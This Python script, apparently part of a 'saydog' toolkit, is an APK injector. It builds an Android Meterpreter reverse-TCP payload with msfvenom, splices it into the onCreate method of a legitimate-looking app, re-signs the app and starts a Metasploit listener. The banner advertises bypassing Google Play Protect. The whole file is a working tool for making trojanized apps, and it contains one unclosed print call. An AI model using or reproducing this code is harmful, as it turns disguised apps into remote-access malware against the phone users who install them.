import os,sys,time,fileinput
from pathlib import PurePath,Path

w="\033[00m"
r="\033[31;1m"
g="\033[32;1m"
y="\033[33m"
d="\033[2;31m"
b="\033[34;1m"
p="\033[35;1m"
c="\033[36;1m"
W="\033[47m"
R="\033[41m"
B="\033[30m"
G="\033[90m"
BG="\033[100m"

pkgname = []
paydir = []
dirmsf = []

def inject():
    try:
        global pkgname,dirsmali,a3,a1,a2
        print("")
        fullpath = str(input(b+"[+]"+w+" path to apk files ("+r+"ex: /sdcard/my.apk"+w+"): "))
        if os.path.isfile(fullpath):
            pass
        else:
            print(r+"[!]"+w+" file doesnt exists !")
            sys.exit(1)
        a1,a2 = os.path.split(fullpath)
        os.system("cp -r "+fullpath+" "+a2)
        pkgname = os.popen('''aapt dump badging '''+a2+''' | awk '/package/{gsub("name=|'"'"'","");'''+"""  print $2}'""").read()
        pkgactivity = os.popen('''aapt dump badging '''+a2+''' | awk '/activity/{gsub("name=|'"'"'","");'''+"""  print $2}'""").read()
        print(b+"[+]"+w+" decompiling "+a2+" using apktool 2.3.4")
        print(b+"[+]"+w+" please wait, this could take a while")
        os.system("proot apktool d -f "+a2+" &> /dev//null")
        if os.path.isdir(a2.replace(".apk","")):
            pass
        else:
            print(r+"[!]"+w+" failed to decompile "+a2)
            sys.exit(1)
        a3 = a2.replace(".apk","")
        pathsmali = os.popen("find -O3 -L "+a3+" -name '*Activity.smali'").read()
        if "MainActivity.smali" in pathsmali:
            pathsmali = os.popen("find -O3 -L "+a3+" -name 'MainActivity.smali'").readline()
            print(w+"----------------------------------------------------")
            print(g+"[✓]"+w+" package name is obtained:-"+y,pkgname.replace("\n",""))
            print(g+"[✓]"+w+" activity detected:-"+y,pkgactivity.replace("\n",""))
            print(g+"[✓]"+w+" smali file:- "+y+pathsmali
        else:
            print(r+"[!]"+w+" main.activity smali doesnt exist, you can choose manually")
            print("----------------------------------------------------\n\n"+y+pathsmali+w+"\n----------------------------------------------------")
            pathsmali = str(input(b+"[+]"+w+" choose activity smali:- "+g))
            if os.path.isfile(pathsmali):
                pass
            else:
                print(r+"[!]"+w+" file activity smali doesnt exist !")
                sys.exit(1)
        cek = open(pathsmali).read()
        if ".method public onCreate(Landroid/os/Bundle;)V" in cek:
            method = "public"
            pass
        elif ".method protected onCreate(Landroid/os/Bundle;)V" in cek:
            method = "protected"
            pass
        else:
            print(r+"[!]"+w+" please choose another path of smali file")
            pathsmali = str(input(b+"[+]"+w+" choose activity smali:- "+g))
            if os.path.isfile(pathsmali):
                cek = open(pathsmali).read()
                if ".method public onCreate(Landroid/os/Bundle;)V" in cek:
                    method = "public"
                    pass
                elif ".method protected onCreate(Landroid/os/Bundle;)V" in cek:
                    method = "protected"
                    pass
                else:
                    print(r+"[!]"+w+" please try again later and choose another path")
                    sys.exit(1)
            else:
                print(r+"[!]"+w+" file activity smali doesnt exist !")
                sys.exit(1)
        a4 = PurePath(pathsmali)
        dirsmali = (a4.parts[0]+"/"+a4.parts[1]+"/"+a4.parts[2]+"/")
        print(g+"[✓]"+w+" target directories:-"+y,dirsmali)
        hooksmali = a4.parts[2]
        print(g+"[✓]"+w+" hook smali:- "+y+"L"+str(hooksmali)+"/metasploit/stage/MainActivity.smali")
        print(w+"----------------------------------------------------")
        replaces = {".method "+str(method)+" onCreate(Landroid/os/Bundle;)V":".method "+str(method)+" onCreate(Landroid/os/Bundle;)V\n    invoke-static {p0}, L"+str(hooksmali)+"/metasploit/stage/Payload;->start(Landroid/content/Context;)V"}
        for line in fileinput.input(pathsmali, inplace=True):
            for search in replaces:
                replaced = replaces[search]
                line = line.replace(search,replaced)
            print(line, end="")
            pass
        embed()
    except KeyboardInterrupt:
        sys.exit(1)
    except IndexError:
        print(r+"[!]"+w+" failed to decompile apk, please choose another apk files")
 
def embed():
    global dirmsf,host,port
    if os.path.isdir("payload"):
        ask = str(input(b+"[+]"+w+" do you want to use the previous payload? (y/n) "))
        if ask == "y" or ask == "Y":
            paydir = "payload"
            pass
        else:
            host = str(input(b+"[+]"+w+" LHOST :- "+g))
            if host == "" or host == " ":
                host = "127.0.0.1"
                print(b+"[+]"+w+" using default LHOST:- "+host)
                pass
            else:
                pass
            port = str(input(b+"[+]"+w+" LPORT :- "+g))
            if port == "" or port == " ":
                port = "8080"
                print(b+"[+]"+w+" using default LPORT:- "+port)
                pass
            else:
                pass
            print(b+"[+]"+w+" generate metasploit payload using msfvenom")
            os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(host)+" lport="+str(port)+" --platform android -a dalvik -o payload.apk &> /dev//null")
            if os.path.isfile("payload.apk"):
                pass
            else:
                print(r+"[!]"+w+" failed to generate metasploit payload")
                sys.exit(1)
            print(b+"[+]"+w+" decompiling payload.apk using apktool 2.3.4")
            print(b+"[+]"+w+" please wait, this could take a while")
            os.system("proot apktool d -f payload.apk &> /dev//null")
            if os.path.isdir("payload"):
                os.system("rm -rf payload.apk")
                paydir = "payload"
                pass
            else:
                print(r+"[!]"+w+" failed to decompile payload.apk")
                sys.exit(1)
    else:
        host = str(input(b+"[+]"+w+" LHOST :- "+g))
        if host == "" or host == " ":
            host = "127.0.0.1"
            print(b+"[+]"+w+" using default LHOST:- "+host)
            pass
        else:
            pass
        port = str(input(b+"[+]"+w+" LPORT :- "+g))
        if port == "" or port == " ":
            port = "8080"
            print(b+"[+]"+w+" using default LPORT:- "+port)
            pass
        else:
            pass
        print(b+"[+]"+w+" generate metasploit payload using msfvenom")
        os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(host)+" lport="+str(port)+" --platform android -a dalvik -o payload.apk &> /dev//null")
        if os.path.isfile("payload.apk"):
            pass
        else:
            print(r+"[!]"+w+" failed to generate metasploit payload")
            sys.exit(1)
        print(b+"[+]"+w+" decompiling payload.apk using apktool 2.3.4")
        print(b+"[+]"+w+" please wait, this could take a while")
        os.system("proot apktool d -f payload.apk &> /dev//null")
        if os.path.isdir("payload"):
            os.system("rm -rf payload.apk")
            paydir = "payload"
            pass
        else:
            print(r+"[!]"+w+" failed to decompile payload.apk")
            sys.exit(1)
    if os.path.isdir(paydir):
        pass
    else:
        print(r+"[!]"+w+" payload directories doesnt exists!")
        sys.exit(1)
    paymsf = paydir+"/smali/com/metasploit/"
    print(b+"[+]"+w+" using injection:- "+y+paymsf)
    os.system("cp -r "+paymsf+" "+str(dirsmali))
    if os.path.isdir(str(dirsmali)+"/metasploit"):
        print(g+"[✓]"+w+" injection succesfully:- "+y+str(dirsmali)+"/metasploit")
        pass
    else:
        print(r+"[!]"+w+" injection failed, please check your directories")
        sys.exit(1)
    print(b+"[+]"+w+" recompiling original apk using apktool 2.4.1")
    os.system("proot apktool241 b "+a3+" -o raw.apk &> /dev//null")
    print(b+"[+]"+w+" signing original apk using apksigner")
    os.system("proot apk-signer -k debug.jks -a debugging -s debugging -f raw.apk -o "+a3+"-injected.apk &> /dev//null")
    if os.path.isfile(a3+"-injected.apk"):
        out = str(input(b+"[+]"+w+" save file to(ex: /sdcard): "+y))
        if os.path.isdir(out):
            os.system("mv "+a3+"-injected.apk "+out)
            print(g+"[✓]"+w+" file saved as:- "+g+out+"/"+a3+"-injected.apk"+w)
            os.system("rm -rf '?' original.apk raw.apk "+a2+" "+a3)
            print("")
            dog = str(input("do you want to start listener? (y/n) "))
            if dog == "y" or dog == "Y":
                os.system('msfconsole -x "use multi/handler;set payload android/meterpreter/reverse_tcp;set lhost '+host+';set lport '+port+';show options"')
            else:
                sys.exit(1)
        else:
            out = "/sdcard"
            os.system("mv "+a3+"-injected.apk /sdcard")
            print(g+"[✓]"+w+" file saved as:- "+g+out+"/"+a3+"-injected.apk"+w)
            os.system("rm -rf '?' original.apk raw.apk "+a2+" "+a3)
            print("")
            dog = str(input("do you want to start listener? (y/n) "))
            if dog == "y" or dog == "Y":
                os.system('msfconsole -x "use multi/handler;set payload android/meterpreter/reverse_tcp;set lhost '+host+';set lport '+port+';show options"')
            else:
                sys.exit(1)
        print("")
        dog = str(input(w+"[ enter ]"))
        sys.exit(1)
    else:
        sys.exit(1)

def menulist():
    print ("")
    print (g+"  NO  TEMPLATE NAME           DESCRIPTIONS")
    print ("")
    print (w+" ("+g+"01"+w+") UC_Mini.apk             Browser")
    print (w+" ("+g+"02"+w+") Speed_test.apk          Internet speed test")
    print (w+" ("+g+"03"+w+") Hackers_keylogger.apk   Android keylogger app")
    print (w+" ("+g+"04"+w+") Vidmate.apk             Apps store")
    print (w+" ("+g+"05"+w+") Droid_sqli.apk          Android sql-injection")
    print (w+" ("+g+"06"+w+") Wps_connect.apk         Wifi password cracker")
    print (w+" ("+g+"07"+w+") Indoxxi.apk             Streaming movies")
    print (w+" ("+g+"08"+w+") Layarkaca21.apk         Streaming movies")
    print (w+" ("+g+"09"+w+") Hackers_keyboard.apk    Keyboard for android")
    print (w+" ("+g+"10"+w+") Infinite_design.apk     Design apps")
    print (w+" ("+g+"11"+w+") PicsayPro.apk           Photo editor")
    print (w+" ("+g+"12"+w+") Avee_player.apk         Music player")
    print ("")
    mainlist()
    
def mainlist():
    dog = str(input(r+"saydog"+w+":"+p+"/choose/"+w+"> "))
    if dog == "1" or dog ==  "01":
        tmp = "UC_Mini"
        src = "com/"
        pass
    elif dog == "2" or dog == "02":
        tmp = "Speed_test"
        src = "pl/"
        pass
    elif dog == "3" or dog == "03":
        tmp = "Hackers_keylogger"
        src = "hack/"
        pass
    elif dog == "4" or dog == "04":
        tmp = "Vidmate"
        src = "com/"
        pass
    elif dog == "5" or dog == "05":
        tmp = "Droid_sqli"
        src = "net/"
        pass
    elif dog == "6" or dog == "06":
        tmp = "Wps_connect"
        src = "com/"
        pass
    elif dog == "7" or dog == "07":
        tmp = "Indoxxi"
        src = "com/"
        pass
    elif dog == "8" or dog == "08":
        tmp = "Layarkaca21"
        src = "com/"
        pass
    elif dog == "9" or dog == "09":
        tmp = "Hackers_keyboard"
        src = "org/"
        pass
    elif dog == "10":
        tmp = "Infinite_design"
        src = "com/"
        pass
    elif dog == "11":
        tmp = "PicsayPro"
        src = "com/"
        pass
    elif dog == "12":
        tmp = "Avee_player"
        src = "com/"
        pass
    else:
        sys.exit(1)
    print("")
    print(b+"[+]"+w+" using template:- "+g+tmp+".apk")
    print(b+"[+]"+w+" downloading apk file from database")
    os.system("wget https://github.com/saydog-official/database/raw/master/android/template/"+tmp+".zip &> /dev//null")
    print(b+"[+]"+w+" decompiling apk file using apktol 2.3.4")
    os.system("unzip "+tmp+".zip &> /dev//null;rm -rf "+tmp+".zip")
    if os.path.isfile("payload.apk"):
        ask = str(input(b+"[+]"+w+" do you want to use the previous payload ? (y/n) "))
        if ask == "y" or ask == "Y":
            pass
        else:
            rhost = str(input(b+"[+]"+w+" set LHOST:- "+g))
            if rhost == "" or rhost == " ":
                rhost = "127.0.0.1"
                print(b+"[+]"+w+" using default LHOST:- "+g+rhost)
                pass
            else:
                pass
            rport = str(input(b+"[+]"+w+" set LPORT:- "+g))
            if rport == "" or rport == " ":
                rport = "8080"
                print(b+"[+]"+w+" using default LPORT:- "+g+rport)
                pass
            else:
                pass
            print(b+"[+]"+w+" generate payload android using msfvenom")
            payload = "msfvenom -p android/meterpreter/reverse_tcp lhost="+str(rhost)+" lport="+str(rport)+" -a dalvik --platform android -o payload.apk &> /dev//null"
            os.system(payload)
            pass
    else:
        rhost = str(input(b+"[+]"+w+" set LHOST:- "+g))
        if rhost == "" or rhost == " ":
            rhost = "127.0.0.1"
            print(b+"[+]"+w+" using default LHOST:- "+g+rhost)
            pass
        else:
            pass
        rport = str(input(b+"[+]"+w+" set LPORT:- "+g))
        if rport == "" or rport == " ":
            rport = "8080"
            print(b+"[+]"+w+" using default LPORT:- "+g+rport)
            pass
        else:
            pass
        print(b+"[+]"+w+" generate payload android using msfvenom")
        payload = "msfvenom -p android/meterpreter/reverse_tcp lhost="+str(rhost)+" lport="+str(rport)+" -a dalvik --platform android -o payload.apk &> /dev//null"
        os.system(payload)
        pass
    print(b+"[+]"+w+" decompiling payload.apk using apktool 2.3.4")
    os.system("proot apktool d -f payload.apk &> /dev//null")
    if os.path.isdir("payload"):
        pass
    else:
        print(r+"[!]"+w+" failed to decompile payload.apk file")
        sys.exit(1)
    print(b+"[+]"+w+" injection "+tmp+".apk with metasploit payload")
    os.system("cp -r payload/smali/com/metasploit/ "+tmp+"/smali/"+src)
    targetdir = tmp+"/smali/"+src+"metasploit"
    if os.path.isdir(targetdir):
        print(g+"[✓]"+w+" injection successfully:- "+y+targetdir)
        pass
    else:
        print(r+"[!]"+w+" failed to inject "+tmp+".apk")
        sys.exit(1)
    print(b+"[+]"+w+" recompiling original apk using apktool 2.4.1")
    os.system("proot apktool241 b "+tmp+" -o original.apk &> /dev//null")
    print(b+"[+]"+w+" signing original apk file using apksigner")
    os.system("proot apk-signer -k debug.jks -a debugging -s debugging -f original.apk -o "+tmp+"-injected.apk &> /dev//null")
    if os.path.isfile(tmp+"-injected.apk"):
        out = str(input(b+"[+]"+w+" save file to(ex: /sdcard): "+y))
        if os.path.isdir(out):
            os.system("mv "+tmp+"-injected.apk "+out)
            print(g+"[✓]"+w+" file saved as:- "+g+out+"/"+tmp+"-injected.apk"+w)
            print("")
            dog = str(input("[ enter ]"))
            os.system("rm -rf '?' original.apk raw.apk "+tmp+".zip "+tmp)
            if dog == "":
                sys.exit(1)
            else:
                sys.exit(1)
        else:
            os.system("mv "+tmp+"-injected.apk /sdcard")
            print(g+"[✓]"+w+" file saved as:- "+g+"/sdcard/"+tmp+"-injected.apk"+w)
            print("")
            dog = str(input("do you want to start listener ? (y/n) "))
            os.system("rm -rf '?' original.apk raw.apk "+tmp+".zip "+tmp)
            if dog == "y" or dog == "Y":
                os.system('msfconsole -x "use multi/handler;set payload android/meterpreter/reverse_tcp;set lhost '+rhost+';set lport '+rport+';show options"')
            else:
                sys.exit(1)
            

def main():
    while True:
        try:
            print ("")
            print (g+" APK INJECTOR"+w+" - by @saydog.official")
            print ("-------------------------------------------")
            print (" Apk injector is a tool to inject payload")
            print (" and embed metasploit apk into original apk")
            print (" bypass google play protect")
            print ("-------------------------------------------")
            print ("")
            print (w+"{"+r+"01"+w+"} Embed payload to original apk from file \033[00;1m\033[41m NEW \033[00m")
            print (w+"{"+r+"02"+w+"} Embed payload to original apk from list")
            print (w+"{"+r+"00"+w+"} Back")
            print ("")
            bal = str(input(r+"saydog"+w+":"+p+"/choose/"+w+"> "))
            if bal == "1" or bal == "01":
                inject()
            elif bal == "2" or bal == "02":
                menulist()
            elif bal == "exit" or bal == "0" or bal == "00":
                sys.exit(1)
        except KeyboardInterrupt:
            sys.exit(1)

if "__main__" == __name__:
        if "--run" in sys.argv:
                main()
        else:
                os.system("saydog")